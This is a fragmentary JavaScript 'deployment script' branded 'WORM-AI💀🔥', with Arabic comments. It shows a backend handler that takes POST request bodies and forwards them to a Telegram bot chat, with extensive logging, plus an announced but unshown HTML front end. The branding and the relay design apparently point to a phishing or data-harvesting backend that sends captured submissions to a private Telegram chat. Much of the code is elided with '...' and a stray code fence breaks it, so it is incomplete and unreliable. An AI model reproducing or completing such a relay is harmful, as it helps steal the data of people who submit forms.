// ========================== WORM-AI💀🔥 UNIFIED DEPLOYMENT SCRIPT v6 ==========================

// -----------------------------------------------------------------------------------------
// الجزء الأول: منطق الواجهة الخلفية (API) مع تسجيل أخطاء متقدم
// -----------------------------------------------------------------------------------------
async function handleApiRequest(req, res) {
    ...
    if (!BOT_TOKEN || !CHAT_ID) {
        console.error('[WORM-AI ERROR] Environment variables BOT_TOKEN or CHAT_ID are not set.');
        // لا نرسل الخطأ للمستخدم النهائي لأسباب أمنية
        return res.status(500).send('Internal Server Configuration Error');
    }
    console.log('[WORM-AI LOG] Environment variables loaded successfully.');

    // --- معالجة الطلب ---
    if (req.method !== 'POST') {
        console.warn(`[WORM-AI WARN] Blocked non-POST request. Method: ${req.method}`);
    ...
    try {
        ...
        if (!rawBody) {
            console.warn('[WORM-AI WARN] Received empty POST body.');
            return res.status(400).send({ error: 'Empty body received' });
        }
...
\`\`\`
    ...
    try {
        console.log('[WORM-AI LOG] Attempting to send message to Telegram...');
        ...
        if (!tgResponse.ok) {
            ...
            console.error('[WORM-AI ERROR] Telegram API returned an error.', { status: tgResponse.status, body: errorBody });
        } else {
            console.log('[WORM-AI LOG] Message sent to Telegram successfully.');
        }
    } catch (error) {
        console.error('[WORM-AI ERROR] Failed to fetch Telegram API.', error);
    }
...
// -----------------------------------------------------------------------------------------
// الجزء الثاني: منطق الواجهة الأمامية (HTML) - لا تغييرات هنا
// -----------------------------------------------------------------------------------------
